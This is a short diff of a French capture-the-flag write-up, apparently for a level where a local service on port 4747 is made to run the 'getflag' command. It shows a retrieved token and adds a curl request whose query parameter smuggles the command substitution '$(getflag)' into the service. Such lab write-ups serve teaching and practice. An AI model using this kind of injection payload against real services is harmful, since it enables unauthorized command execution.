@@ -32,3 +32,5 @@ Quand on execute le programme directement dans le terminal il ne nous affiche qu
 
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
+Nous pouvons aussi utiliser curl localhost:4747?x=\$\(getflag\)
+
